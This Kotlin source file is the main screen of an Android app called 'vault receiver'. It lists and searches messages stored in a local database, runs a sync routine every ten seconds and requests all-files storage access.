package com.admin.vault.receiver

import android.Manifest
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.text.Editable
import android.text.TextWatcher
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.admin.vault.receiver.data.AppDatabase
import kotlinx.coroutines.launch
import java.util.Timer
import java.util.TimerTask

class MainActivity : AppCompatActivity() {
    private val syncManager by lazy { SyncManager(this) }
    private lateinit var adapter: VaultAdapter // (Adapter code niche hai)

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // UI Layout Code (Programmatic - No XML needed strictly)
        setContentView(R.layout.activity_main) // Ensure layout XML exists with recyclerView & searchBox

        checkPermissions()

        val recycler = findViewById<RecyclerView>(R.id.recyclerView)
        val search = findViewById<EditText>(R.id.searchBox)
        
        adapter = VaultAdapter()
        recycler.layoutManager = LinearLayoutManager(this)
        recycler.adapter = adapter

        // 1. Database Observer (Live Data)
        lifecycleScope.launch {
            AppDatabase.getDatabase(this@MainActivity).messageDao().getAllMessages().collect {
                adapter.submitList(it)
            }
        }

        // 2. Search Logic
        search.addTextChangedListener(object : TextWatcher {
            override fun afterTextChanged(s: Editable?) {
                lifecycleScope.launch {
                    AppDatabase.getDatabase(this@MainActivity).messageDao()
                        .searchMessages(s.toString())
                        .collect { adapter.submitList(it) }
                }
            }
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
        })

        // 3. Auto-Sync Loop (Every 10 seconds)
        Timer().schedule(object : TimerTask() {
            override fun run() {
                syncManager.executeVacuum()
            }
        }, 0, 10000)
    }

    private fun checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
        } else {
            requestPermissions(arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE), 100)
        }
    }
}
